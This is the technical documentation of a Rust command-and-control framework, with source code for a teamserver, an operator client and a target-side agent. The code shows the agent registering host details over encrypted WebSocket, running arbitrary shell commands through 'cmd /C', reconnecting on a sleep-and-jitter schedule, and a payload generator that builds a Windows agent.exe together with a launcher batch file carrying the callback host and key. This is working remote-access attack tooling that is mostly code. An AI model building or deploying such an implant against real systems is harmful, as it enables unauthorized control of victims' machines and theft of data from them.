# C2 Framework - Technical Documentation

## Table of Contents
1. [Architecture Overview](#architecture-overview)
2. [Core Components](#core-components)
3. [Data Flow](#data-flow)
4. [Security Implementation](#security-implementation)
5. [Communication Protocol](#communication-protocol)
6. [Session Management](#session-management)
7. [Command Execution System](#command-execution-system)
8. [Payload Generation](#payload-generation)
9. [Error Handling](#error-handling)
10. [Configuration System](#configuration-system)
11. [Logging System](#logging-system)
12. [Build System](#build-system)
13. [Implementation Status](#implementation-status)

---

## Architecture Overview

The C2 framework follows a **three-tier architecture** with clear separation of concerns:

```
┌─────────────────┐    WebSocket    ┌─────────────────┐    WebSocket    ┌─────────────────┐
│   C2 Client     │ ◄──────────────► │  C2 Teamserver  │ ◄──────────────► │  C2 Agent       │
│   (Controller)  │                 │   (Server)      │                 │  (Target)       │
└─────────────────┘                 └─────────────────┘                 └─────────────────┘
```

### Component Roles

- **C2 Client**: Controller interface for managing agents
- **C2 Teamserver**: Central server that routes messages between clients and agents
- **C2 Agent**: Remote executable that runs on target systems

---

## Core Components

### 1. Type System (`types.rs`)

The type system defines all data structures used throughout the framework:

#### Key Types

```rust
// Unique agent identifier
pub type AgentId = Uuid;

// Command types that can be executed
pub enum CommandType {
    ShellCommand(String),           // Execute shell command
    GetSystemInfo,                  // Get system information
    Kill,                          // Terminate agent
    Sleep { duration: u64, jitter_percent: u8 }, // Configure sleep
    GetProcessList,                // List processes (basic implementation)
    KillProcess(u32),              // Kill specific process (basic implementation)
}

// Command execution responses
pub enum CommandResponse {
    Success { output: String, exit_code: i32 },
    Error { error: String, exit_code: i32 },
    SystemInfo(SystemInfo),
    ProcessList(Vec<ProcessInfo>), // Basic process information
}

// Agent information structure
pub struct AgentInfo {
    pub id: AgentId,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub ip_address: String,
    pub mac_address: String,
    pub first_seen: DateTime<Utc>,
    pub last_seen: DateTime<Utc>,
    pub status: AgentStatus,
    pub version: String,
}

// WebSocket message types
pub enum Message {
    Register { agent_info: AgentInfo },
    Heartbeat { agent_id: AgentId, timestamp: DateTime<Utc> },
    Command { command_id: Uuid, command: CommandType },
    RelayCommand { agent_id: AgentId, command_id: Uuid, command: CommandType },
    Response { command_id: Uuid, response: CommandResponse },
    Error { error: String },
    ListAgentsRequest,
    ListAgentsResponse { agents: Vec<AgentInfoExtended> },
}
```

### 2. Encryption System (`crypto.rs`)

The encryption system provides **AES-256-GCM encryption** with **HMAC authentication**:

#### EncryptionKey Implementation

```rust
pub struct EncryptionKey {
    key: Key<Aes256Gcm>,      // AES-256-GCM key
    hmac_key: Vec<u8>,        // HMAC key for integrity
}

impl EncryptionKey {
    // Create key from string (SHA-256 hash)
    pub fn new(key_str: &str) -> Result<Self> {
        let mut hasher = Sha256::new();
        hasher.update(key_str.as_bytes());
        let key_bytes = hasher.finalize();
        
        let key = Key::<Aes256Gcm>::from_slice(&key_bytes);
        let hmac_key = key_bytes.to_vec();
        
        Ok(Self { key: *key, hmac_key })
    }
    
    // Encrypt with authentication
    pub fn encrypt(&self, data: &[u8]) -> Result<Vec<u8>> {
        let cipher = Aes256Gcm::new(&self.key);
        let nonce_bytes: [u8; 12] = OsRng.gen();  // Random nonce
        let nonce = Nonce::from_slice(&nonce_bytes);
        
        // Encrypt data
        let ciphertext = cipher.encrypt(nonce, data)?;
        
        // Combine nonce + ciphertext + HMAC
        let mut result = Vec::new();
        result.extend_from_slice(&nonce_bytes);
        result.extend_from_slice(&ciphertext);
        
        // Add HMAC for integrity
        let mut mac = <Hmac<Sha256> as HmacMac>::new_from_slice(&self.hmac_key)?;
        mac.update(&result);
        let hmac = mac.finalize();
        result.extend_from_slice(hmac.into_bytes().as_slice());
        
        Ok(result)
    }
    
    // Decrypt with integrity verification
    pub fn decrypt(&self, encrypted_data: &[u8]) -> Result<Vec<u8>> {
        // Extract HMAC and verify integrity
        let hmac_start = encrypted_data.len() - 32;
        let data_without_hmac = &encrypted_data[..hmac_start];
        let expected_hmac = &encrypted_data[hmac_start..];
        
        // Verify HMAC
        let mut mac = <Hmac<Sha256> as HmacMac>::new_from_slice(&self.hmac_key)?;
        mac.update(data_without_hmac);
        let computed_hmac = mac.finalize();
        
        if computed_hmac.into_bytes().as_slice() != expected_hmac {
            return Err(anyhow!("HMAC verification failed"));
        }
        
        // Extract nonce and ciphertext
        let nonce_bytes = &data_without_hmac[..12];
        let ciphertext = &data_without_hmac[12..];
        
        // Decrypt
        let cipher = Aes256Gcm::new(&self.key);
        let nonce = Nonce::from_slice(nonce_bytes);
        let plaintext = cipher.decrypt(nonce, ciphertext)?;
        
        Ok(plaintext)
    }
}
```

### 3. Communication Protocol (`protocol.rs`)

The protocol layer handles **WebSocket communication** with encryption:

#### Protocol Handler

```rust
pub struct Protocol {
    encryption_key: EncryptionKey,
}

impl Protocol {
    // Serialize and encrypt message
    pub fn serialize_message(&self, message: &Message) -> Result<String> {
        let json = serde_json::to_string(message)?;
        self.encryption_key.encrypt_b64(json.as_bytes())
    }
    
    // Decrypt and deserialize message
    pub fn deserialize_message(&self, encrypted_data: &str) -> Result<Message> {
        let decrypted = self.encryption_key.decrypt_b64(encrypted_data)?;
        let json = String::from_utf8(decrypted)?;
        serde_json::from_str(&json)
    }
}
```

#### Connection Managers

```rust
// Agent-side connection
pub struct AgentConnection {
    ws_stream: WebSocketStream<MaybeTlsStream<TcpStream>>,
    protocol: Protocol,
    agent_id: Option<AgentId>,
}

// Server-side connection
pub struct ServerConnection {
    ws_stream: WebSocketStream<MaybeTlsStream<TcpStream>>,
    protocol: Protocol,
    agent_id: Option<AgentId>,
}

// Plain TCP server connection
pub struct ServerConnectionPlain {
    ws_stream: WebSocketStream<TcpStream>,
    protocol: Protocol,
    agent_id: Option<AgentId>,
}
```

### 4. Session Management (`protocol.rs`)

The session manager tracks agent connections and states:

```rust
pub struct SessionManager {
    sessions: HashMap<AgentId, Session>,
}

impl SessionManager {
    // Add new agent session
    pub fn add_session(&mut self, agent_id: AgentId, session: Session) {
        self.sessions.insert(agent_id, session);
    }
    
    // Update agent heartbeat
    pub fn update_heartbeat(&mut self, agent_id: &AgentId) -> Result<()> {
        if let Some(session) = self.sessions.get_mut(agent_id) {
            session.last_heartbeat = Utc::now();
            Ok(())
        } else {
            Err(anyhow!("Session not found"))
        }
    }
    
    // Get online agents
    pub fn get_online_agents(&self) -> Vec<AgentId> {
        self.sessions
            .iter()
            .filter(|(_, session)| matches!(session.status, AgentStatus::Online))
            .map(|(id, _)| *id)
            .collect()
    }
    
    // Clean up stale sessions
    pub fn cleanup_offline_sessions(&mut self, timeout_seconds: u64) {
        let now = Utc::now();
        let timeout_duration = Duration::seconds(timeout_seconds as i64);
        
        self.sessions.retain(|_, session| {
            let time_since_heartbeat = now - session.last_heartbeat;
            time_since_heartbeat < timeout_duration
        });
    }
}
```

---

## Data Flow

### 1. Agent Registration Flow

```
Agent                    Teamserver
  |                        |
  |-- Register ----------->|
  |                        |-- Create Session
  |                        |-- Store Connection
  |<-- Success ------------|
```

**Implementation:**
```rust
// Agent side (agent.rs)
async fn connect_and_run(&mut self) -> Result<()> {
    let mut connection = AgentConnection::connect(&self.config.server_url, self.encryption_key.clone()).await?;
    
    // Get system information
    let agent_info = self.get_system_info();
    
    // Register with the server
    connection.register(agent_info.clone()).await?;
    connection.set_agent_id(agent_info.id);
    
    println!("✅ Registered with teamserver");
    // ... continue with heartbeat loop
}

// Teamserver side (teamserver.rs)
match message {
    Message::Register { agent_info } => {
        let agent_id_val = agent_info.id;
        
        // Store the connection
        if let Ok(mut connections) = connections.lock() {
            connections.insert(agent_id_val, tx.clone());
        }
        
        // Register the session
        if let Ok(mut sm) = session_manager.lock() {
            let session = Session {
                agent_id: agent_id_val,
                agent_info: agent_info.clone(),
                last_heartbeat: Utc::now(),
                status: AgentStatus::Online,
                pending_commands: HashMap::new(),
                sleep_duration: None,
                sleep_jitter: None,
            };
            sm.add_session(agent_id_val, session);
        }
        
        println!("✅ Agent registered: {} ({})", agent_info.hostname, agent_id_val);
    }
}
```

### 2. Command Execution Flow

```
Client                    Teamserver                    Agent
  |                         |                            |
  |-- RelayCommand -------->|                            |
  |                         |-- Command ---------------->|
  |                         |                            |-- Execute Command
  |                         |<-- Response ---------------|
  |<-- Response ------------|                            |
```

**Implementation:**
```rust
// Client side (server/main.rs)
async fn execute_command(&self, agent_id_str: &str, command: &str) -> Result<()> {
    let agent_id: Uuid = agent_id_str.parse()?;
    let command_id = Uuid::new_v4();
    let command_type = CommandType::ShellCommand(command.to_string());
    
    // Send relay command to teamserver
    if let Ok(connections) = self.connections.lock() {
        if let Some(tx) = connections.get(&Uuid::nil()) {
            let relay_msg = Message::RelayCommand {
                agent_id,
                command_id,
                command: command_type,
            };
            tx.try_send(relay_msg)?;
        }
    }
}

// Teamserver side (teamserver.rs)
match message {
    Message::RelayCommand { agent_id, command_id, command } => {
        // Forward command to specific agent
        if let Ok(connections) = connections.lock() {
            if let Some(agent_tx) = connections.get(&agent_id) {
                let command_msg = Message::Command { command_id, command };
                if let Err(e) = agent_tx.try_send(command_msg) {
                    eprintln!("Failed to send command to agent: {}", e);
                }
            }
        }
    }
    Message::Response { command_id, response } => {
        // Forward response back to client
        if let Ok(connections) = connections.lock() {
            for (_, client_tx) in connections.iter() {
                if let Err(e) = client_tx.try_send(Message::Response { command_id, response: response.clone() }) {
                    eprintln!("Failed to forward response: {}", e);
                }
            }
        }
    }
}

// Agent side (agent.rs)
async fn execute_command(&self, command: CommandType) -> Result<CommandResponse> {
    match command {
        CommandType::ShellCommand(cmd) => {
            let output = std::process::Command::new("cmd")
                .args(&["/C", &cmd])
                .output()?;
            
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            let combined_output = format!("STDOUT:\n{}\nSTDERR:\n{}", stdout, stderr);
            
            Ok(CommandResponse::Success {
                output: combined_output,
                exit_code: output.status.code().unwrap_or(0),
            })
        }
        // ... other command types
    }
}
```

### 3. Heartbeat Flow

```
Agent                    Teamserver
  |                        |
  |-- Heartbeat ---------->|
  |                        |-- Update Session
  |                        |-- Check Timeout
```

**Implementation:**
```rust
// Agent side (agent.rs)
loop {
    tokio::select! {
        // Send heartbeat
        _ = sleep(heartbeat_interval) => {
            if let Some(_agent_id) = self.agent_id {
                if let Err(e) = connection.send_heartbeat().await {
                    eprintln!("Failed to send heartbeat: {}", e);
                    return Err(e);
                }
            }
        }
        // ... receive commands
    }
}

// Teamserver side (teamserver.rs)
match message {
    Message::Heartbeat { agent_id, timestamp } => {
        // Update session heartbeat
        if let Ok(mut sm) = session_manager.lock() {
            if let Err(e) = sm.update_heartbeat(&agent_id) {
                eprintln!("Failed to update heartbeat: {}", e);
            }
        }
        
        // Clean up stale sessions periodically
        if let Ok(mut sm) = session_manager.lock() {
            sm.cleanup_offline_sessions(300); // 5 minute timeout
        }
    }
}
```

---

## Security Implementation

### 1. Encryption

- **Algorithm**: AES-256-GCM (Galois/Counter Mode)
- **Key Derivation**: SHA-256 hash of user-provided key
- **Nonce**: Random 12-byte nonce for each encryption
- **Integrity**: HMAC-SHA256 for tamper detection
- **Encoding**: Base64 for text transmission

### 2. Input Validation

```rust
// File path validation (utils.rs)
pub fn validate_file_path(path: &str) -> Result<()> {
    let path_obj = Path::new(path);
    
    // Check for path traversal attempts
    if path.contains("..") {
        return Err(anyhow!("Path traversal not allowed"));
    }
    
    // Check for absolute paths (optional security measure)
    if path_obj.is_absolute() {
        return Err(anyhow!("Absolute paths not allowed"));
    }
    
    Ok(())
}
```

### 3. Session Security

- **Unique Agent IDs**: UUID v4 for each agent
- **Connection Tracking**: Live connection validation
- **Session Timeout**: Automatic cleanup of stale sessions
- **Encrypted Communication**: All messages encrypted end-to-end

---

## Communication Protocol

### Message Format

All messages are:
1. **Serialized** to JSON
2. **Encrypted** with AES-256-GCM
3. **Base64 encoded** for text transmission
4. **Sent** via WebSocket

### Message Types

```rust
pub enum Message {
    // Agent registration
    Register { agent_info: AgentInfo },
    
    // Heartbeat from agent
    Heartbeat { agent_id: AgentId, timestamp: DateTime<Utc> },
    
    // Command from server to agent
    Command { command_id: Uuid, command: CommandType },
    
    // Relay command from client to teamserver
    RelayCommand { agent_id: AgentId, command_id: Uuid, command: CommandType },
    
    // Response from agent to server
    Response { command_id: Uuid, response: CommandResponse },
    
    // Error message
    Error { error: String },
    
    // Agent listing
    ListAgentsRequest,
    ListAgentsResponse { agents: Vec<AgentInfoExtended> },
}
```

---

## Session Management

### Session Structure

```rust
pub struct Session {
    pub agent_id: AgentId,
    pub agent_info: AgentInfo,
    pub last_heartbeat: DateTime<Utc>,
    pub status: AgentStatus,
    pub pending_commands: HashMap<Uuid, CommandStatus>,
    pub sleep_duration: Option<u64>,  // Sleep duration in milliseconds
    pub sleep_jitter: Option<u8>,     // Jitter percentage
}
```

### Session Lifecycle

1. **Registration**: Agent connects and registers with system info
2. **Active**: Agent sends heartbeats and executes commands
3. **Offline**: Agent stops responding, marked as offline
4. **Cleanup**: Stale sessions removed after timeout

### Session Persistence

Sessions are persisted to `sessions.json` for recovery:

```rust
fn write_sessions_to_file(&self) {
    if let Ok(sm) = self.session_manager.lock() {
        let sessions: Vec<&Session> = sm.get_all_sessions().values().collect();
        match serde_json::to_string_pretty(&sessions) {
            Ok(json) => {
                if let Err(e) = std::fs::write("sessions.json", &json) {
                    eprintln!("Failed to write sessions.json: {}", e);
                }
            },
            Err(e) => {
                eprintln!("Failed to serialize sessions: {}", e);
            }
        }
    }
}
```

---

## Command Execution System

### Command Types

```rust
pub enum CommandType {
    ShellCommand(String),           // Execute shell command
    GetSystemInfo,                  // Get system information
    Kill,                          // Terminate agent
    Sleep { duration: u64, jitter_percent: u8 }, // Configure sleep
    GetProcessList,                // List processes (basic implementation)
    KillProcess(u32),              // Kill specific process (basic implementation)
}
```

### Command Execution Flow

1. **Client** sends command with unique ID
2. **Teamserver** routes command to specific agent
3. **Agent** executes command and captures output
4. **Agent** sends response back through teamserver
5. **Client** receives response and displays results

### Command Response Handling

```rust
pub enum CommandResponse {
    Success { output: String, exit_code: i32 },
    Error { error: String, exit_code: i32 },
    SystemInfo(SystemInfo),
    ProcessList(Vec<ProcessInfo>), // Basic process information
}
```

### Process Management (Basic Implementation)

The current process management implementation provides placeholder functionality:

```rust
// Agent side (agent.rs)
CommandType::GetProcessList => {
    println!("Getting process list");
    // For now, return a simple process list
    // In a real implementation, you'd use sysinfo or similar
    let processes = vec![
        ProcessInfo {
            pid: 1,
            name: "System".to_string(),
            command: "System".to_string(),
            memory_usage: 0,
            cpu_usage: 0.0,
        }
    ];
    Ok(CommandResponse::ProcessList(processes))
}
CommandType::KillProcess(pid) => {
    println!("Killing process with PID: {}", pid);
    // For now, just acknowledge the command
    // In a real implementation, you'd actually kill the process
    Ok(CommandResponse::Success {
        output: format!("Kill command received for PID: {}", pid),
        exit_code: 0,
    })
}
```

---

## Payload Generation

### Cross-Compilation Process

The payload generation system creates Windows executables from the agent code:

```rust
async fn generate_payload(&self, output: &str, callback: &str, port: u16, key: &str) -> Result<()> {
    // Check for Windows target
    let target_check = Command::new("rustup")
        .args(&["target", "list", "--installed"])
        .output()?;

    let targets = String::from_utf8_lossy(&target_check.stdout);
    let windows_target = if targets.contains("x86_64-pc-windows-msvc") {
        "x86_64-pc-windows-msvc"
    } else {
        // Install Windows target if not present
        Command::new("rustup")
            .args(&["target", "add", "x86_64-pc-windows-msvc"])
            .status()?;
        "x86_64-pc-windows-msvc"
    };

    // Build agent for Windows
    let build_status = Command::new("cargo")
        .args(&[
            "build",
            "--release",
            "--bin",
            "agent",
            "--target",
            windows_target,
        ])
        .status()?;

    // Copy executable to output path
    let source_path = format!("target/{}/release/agent.exe", windows_target);
    fs::copy(&source_path, output)?;

    // Create batch file for deployment
    let batch_content = format!(
        r#"@echo off
echo Starting C2 Agent...
echo Callback: {}:{}
echo.

REM Run the agent with the specified parameters
"%~dp0{}" --server "ws://{}:{}" --key "{}" --heartbeat 30

echo.
echo Agent finished.
pause
"#,
        callback, port, 
        Path::new(output).file_name().unwrap().to_str().unwrap(),
        callback, port, key
    );

    let batch_path = output.replace(".exe", ".bat");
    fs::write(&batch_path, batch_content)?;

    Ok(())
}
```

### Generated Files

1. **`payload.exe`**: Windows agent executable
2. **`payload.bat`**: Deployment script with connection parameters

---

## Error Handling

### Error Propagation

The framework uses `anyhow::Result<T>` for comprehensive error handling:

```rust
use anyhow::{Result, anyhow};

// Example error handling in encryption
pub fn decrypt(&self, encrypted_data: &[u8]) -> Result<Vec<u8>> {
    if encrypted_data.len() < 44 {
        return Err(anyhow!("Encrypted data too short"));
    }
    
    // ... decryption logic
    
    if computed_hmac.into_bytes().as_slice() != expected_hmac {
        return Err(anyhow!("HMAC verification failed"));
    }
    
    // ... more logic
}
```

### Connection Error Handling

```rust
// Agent retry logic
async fn start(&mut self) -> Result<()> {
    loop {
        match self.connect_and_run().await {
            Ok(_) => {
                log_warning("agent", "Connection closed, retrying...");
                sleep(Duration::from_secs(self.config.retry_interval)).await;
            }
            Err(e) => {
                log_error("agent", &format!("Connection error: {}", e));
                sleep(Duration::from_secs(self.config.retry_interval)).await;
            }
        }
    }
}
```

---

## Configuration System

### Configuration Structures

```rust
// Server configuration
pub struct ServerConfig {
    pub bind_address: String,
    pub port: u16,
    pub encryption_key: String,
    pub heartbeat_interval: u64,
    pub command_timeout: u64,
    pub max_agents: usize,
    pub log_level: String,
}

// Agent configuration
pub struct AgentConfig {
    pub server_url: String,
    pub encryption_key: String,
    pub heartbeat_interval: u64,
    pub retry_interval: u64,
    pub max_retries: u32,
    pub user_agent: String,
    pub proxy: Option<String>,
}

// Client configuration
pub struct ClientConfig {
    pub teamserver_url: String,
    pub encryption_key: String,
    pub timeout: u64,
    pub retry_interval: u64,
    pub max_retries: u32,
}
```

### Default Configurations

```rust
impl Default for ServerConfig {
    fn default() -> Self {
        Self {
            bind_address: "127.0.0.1".to_string(),
            port: 8080,
            encryption_key: "default-key-change-in-production".to_string(),
            heartbeat_interval: 30,
            command_timeout: 300,
            max_agents: 1000,
            log_level: "info".to_string(),
        }
    }
}
```

---

## Logging System

### Logging Functions

```rust
// Initialize logs directory
pub fn init_logs_directory() -> std::io::Result<()> {
    let logs_dir = Path::new("logs");
    if !logs_dir.exists() {
        fs::create_dir(logs_dir)?;
    }
    Ok(())
}

// Write log message
pub fn write_log(component: &str, message: &str) -> std::io::Result<()> {
    init_logs_directory()?;
    
    let timestamp = Utc::now().format("%Y-%m-%d %H:%M:%S%.3f");
    let log_message = format!("[{}] {}\n", timestamp, message);
    
    let log_file = format!("logs/{}.log", component);
    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(log_file)?;
    
    file.write_all(log_message.as_bytes())
}

// Logging macros
pub fn log_info(component: &str, message: &str) {
    let _ = write_log(component, &format!("[INFO] {}", message));
    println!("[{}] {}", component, message);
}

pub fn log_error(component: &str, message: &str) {
    let _ = write_log(component, &format!("[ERROR] {}", message));
    eprintln!("[{}] ERROR: {}", component, message);
}

pub fn log_success(component: &str, message: &str) {
    let _ = write_log(component, &format!("[SUCCESS] {}", message));
    println!("[{}] ✅ {}", component, message);
}
```

### Log Files

- **`logs/teamserver.log`**: Teamserver activity
- **`logs/client.log`**: Client activity
- **`logs/agent.log`**: Agent activity

---

## Build System

### Cargo Configuration

```toml
[package]
name = "rust-c2"
version = "0.1.0"
edition = "2021"

[[bin]]
name = "teamserver"
path = "src/teamserver.rs"

[[bin]]
name = "agent"
path = "src/agent.rs"

[[bin]]
name = "client"
path = "src/server/main.rs"
```

### Dependencies

```toml
[dependencies]
# CLI and user interface
clap = { version = "4.4", features = ["derive"] }
tokio = { version = "1.35", features = ["full"] }
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"
toml = "0.8"

# Networking
tokio-tungstenite = { version = "0.21", features = ["native-tls"] }
tungstenite = { version = "0.21", features = ["native-tls"] }

# Cryptography and security
aes-gcm = "0.10"
rand = "0.8"
base64 = "0.21"
sha2 = "0.10"
hmac = "0.12"

# System operations
sysinfo = "0.30"
chrono = { version = "0.4", features = ["serde"] }
uuid = { version = "1.6", features = ["v4", "serde"] }
hostname = "0.3"
num_cpus = "1.16"

# Async runtime
futures = "0.3"
futures-util = "0.3"
async-trait = "0.1"

# Error handling
anyhow = "1.0"
thiserror = "1.0"

# Windows API for BOF execution (planned for future implementation)
[target.'cfg(windows)'.dependencies]
windows-sys = { version = "0.48", features = [
    "Win32_System_Memory",
    "Win32_Foundation", 
    "Win32_System_Threading",
    "Win32_System_Diagnostics_Debug",
    "Win32_Security_Authorization"
]}
```

### Build Commands

```bash
# Build all components
cargo build --release

# Build specific component
cargo build --bin teamserver --release
cargo build --bin agent --release
cargo build --bin client --release

# Cross-compile for Windows
cargo build --bin agent --target x86_64-pc-windows-msvc --release
```

---

## Implementation Status

### Currently Implemented Features

1. **Core C2 Framework**
   - ✅ Teamserver with WebSocket communication
   - ✅ Agent with automatic reconnection
   - ✅ Client with interactive interface
   - ✅ Session management and persistence
   - ✅ AES-256-GCM encryption with HMAC

2. **Command Execution**
   - ✅ Shell command execution
   - ✅ System information gathering
   - ✅ Agent termination
   - ✅ Sleep/jitter configuration
   - ✅ Basic process management (placeholder)

3. **Security Features**
   - ✅ End-to-end encryption
   - ✅ Session authentication
   - ✅ Input validation
   - ✅ Connection tracking

4. **Payload Generation**
   - ✅ Windows executable generation
   - ✅ Cross-compilation support
   - ✅ Deployment script creation

### Planned for Future Implementation

1. **Enhanced Process Management**
   - 🔄 Full process listing with detailed information
   - 🔄 Process filtering and search capabilities
   - 🔄 Secure process termination with proper permissions
   - 🔄 Resource monitoring (CPU, memory usage)

2. **BOF (Beacon Object File) Support**
   - 🔄 Windows API integration for BOF execution
   - 🔄 Memory management and thread handling
   - 🔄 Debug API access
   - 🔄 Security context management

3. **Working Directory Management**
   - 🔄 Get current working directory from agents
   - 🔄 Change working directory
   - 🔄 File system navigation

4. **Enhanced Interactive Shell**
   - 🔄 Working directory navigation
   - 🔄 Process interaction capabilities
   - 🔄 File system management
   - 🔄 Enhanced command history

5. **Advanced Session Features**
   - 🔄 Real-time session status monitoring
   - 🔄 Advanced session management
   - 🔄 Session persistence and recovery

### Implementation Notes

- **Process Management**: Currently implemented as placeholder functionality with basic acknowledgment
- **BOF Support**: Dependencies are included but not yet utilized in the codebase
- **Interactive Shell**: Basic implementation exists, enhanced features planned
- **Working Directory**: Command structure exists but not implemented

---

## Key Design Principles

### 1. Separation of Concerns
- **Types**: Data structures and serialization
- **Crypto**: Encryption and security
- **Protocol**: Communication handling
- **Utils**: Common utilities
- **Components**: Agent, Teamserver, Client

### 2. Async/Await Pattern
- Non-blocking I/O operations
- Concurrent connection handling
- Efficient resource utilization

### 3. Error Handling
- Comprehensive error propagation
- Graceful failure recovery
- Detailed error logging

### 4. Security First
- End-to-end encryption
- Input validation
- Secure defaults
- Tamper detection

### 5. Extensibility
- Modular architecture
- Plugin-friendly design
- Configuration-driven behavior

---

## Performance Considerations

### 1. Connection Management
- **Connection Pooling**: Reuse connections when possible
- **Timeout Handling**: Automatic cleanup of stale connections
- **Load Balancing**: Distribute load across multiple teamservers

### 2. Memory Management
- **Session Cleanup**: Automatic removal of stale sessions
- **Resource Limits**: Configurable limits for agents and commands
- **Efficient Serialization**: JSON for human readability, binary for performance

### 3. Network Optimization
- **Compression**: Consider gzip for large payloads
- **Batching**: Group multiple commands when possible
- **Heartbeat Optimization**: Configurable intervals

---

## Deployment Considerations

### 1. Production Security
- **Change Default Keys**: Always use strong encryption keys
- **Network Security**: Use TLS for teamserver connections
- **Access Control**: Implement authentication for clients
- **Logging**: Configure appropriate log levels

### 2. Scalability
- **Multiple Teamservers**: Load balance across servers
- **Database Backend**: Use database for session persistence
- **Monitoring**: Implement health checks and metrics

### 3. Maintenance
- **Updates**: Regular security updates
- **Backups**: Session and configuration backups
- **Monitoring**: Log analysis and alerting

---

This technical documentation provides a comprehensive overview of how the C2 framework works internally. The architecture is designed for security, scalability, and maintainability while providing a robust foundation for command and control operations. Future enhancements will build upon this solid foundation to add advanced features like full process management, BOF support, and enhanced interactive capabilities. 
